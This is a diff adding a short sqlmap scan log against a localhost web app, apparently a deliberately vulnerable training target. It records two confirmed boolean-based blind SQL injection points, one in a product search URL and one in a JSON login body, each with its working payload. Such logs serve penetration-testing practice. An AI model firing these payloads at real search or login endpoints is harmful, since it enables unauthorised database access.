@@ -1,0 +1,16 @@
+sqlmap identified the following injection point(s) with a total of 41 HTTP(s) requests:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://localhost:3000/rest/products/search?q=') AND 4414=4414 AND ('trFM' LIKE 'trFM
+---
+back-end DBMS: SQLite
+sqlmap identified the following injection point(s) with a total of 441 HTTP(s) requests:
+---
+Parameter: JSON #1* ((custom) POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
+    Payload: {"email":"' AND CASE WHEN 4699=4699 THEN 4699 ELSE JSON(CHAR(81,79,114,86)) END-- mDYe","password":"test"}
+---
+back-end DBMS: SQLite
